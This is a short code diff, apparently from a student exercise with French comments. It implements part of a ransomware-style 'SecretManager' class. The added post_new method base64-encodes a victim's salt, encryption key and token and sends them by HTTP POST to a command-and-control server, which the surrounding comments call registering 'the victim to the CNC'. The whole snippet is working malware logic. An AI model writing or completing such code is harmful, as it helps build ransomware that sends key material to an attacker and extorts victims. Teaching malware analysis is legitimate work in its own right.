@@ -44,9 +44,13 @@ class SecretManager:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
 
-    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
-        raise NotImplemented()
+    def post_new(self, salt:bytes, key:bytes, token:bytes) -> None:
+        url = f"http://{self._remote_host_port}/new"  #j'insère l'url prédéfinis avec f et ajoute le /new sous entendu par le sujet
+        data = {
+            "token": self.bin_to_b64(token), #conversion en base64
+            "salt": self.bin_to_b64(salt),   #conversion en base64
+            "key": self.bin_to_b64(key)}     #conversion en base64
+        requests.post(url, json=data)   #Utilisation de la fonction post de request qui prend un url et la data à envoyer en paramètre
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
